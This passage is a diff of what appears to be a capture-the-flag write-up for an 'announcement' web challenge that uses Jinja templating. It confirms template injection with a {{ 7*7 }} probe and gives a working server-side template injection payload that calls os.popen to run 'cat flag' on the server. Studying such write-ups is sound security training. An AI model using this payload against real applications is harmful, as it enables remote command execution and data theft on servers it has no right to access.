@@ -5,8 +5,9 @@
 **Description**
 I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!
 
-> Uses Python Jinja Template Engine. confirmed by ``{{ 7*7 }}``
-> Finally executed with 
+> Uses Python Jinja Template Engine. confirmed by `{{ 7*7 }}`
+> Finally executed with
+
 ```python
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
 
